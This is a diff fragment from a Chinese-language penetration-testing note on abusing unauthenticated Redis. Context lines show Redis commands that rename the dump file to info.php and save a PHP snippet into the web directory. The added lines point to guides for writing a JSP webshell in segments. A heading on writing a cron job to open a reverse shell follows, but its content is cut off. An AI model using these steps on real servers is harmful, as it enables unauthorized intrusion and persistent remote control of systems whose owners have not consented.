@@ -53,6 +53,13 @@ config set dbfilename info.php  //把数据库名dump.rdb改为info.php
 set x  "<?php phpinfo();?>"        //一个字典数据
 save    //写入快照，也就把info.php写如网站目录下                                
 ```
+
+写jsp的webshell比较长，需要按照分段一定顺序写入，参考：
+https://cloud.tencent.com/developer/article/2422977
+
+<https://mp.weixin.qq.com/s?__biz=MzI3NzI4OTkyNw==&mid=2247489517&idx=1&sn=8c7fe6ee088f69d942278a87b1563943&chksm=ea1b8ece9279defb52a7e236a4a4bff8829dc5ef4d5e9d7c3b803ff9e9f41a1368f9560df022&mpshare=1&scene=23&srcid=1017nbHrNHmzb0EPRZGC6xHm&sharer_shareinfo=cb096fec12520848442a4490e895b708&sharer_shareinfo_first=cb096fec12520848442a4490e895b708#rd>
+
+
 ## **写定时任务文件，开启反弹shell**
 ```
 连接上redis后
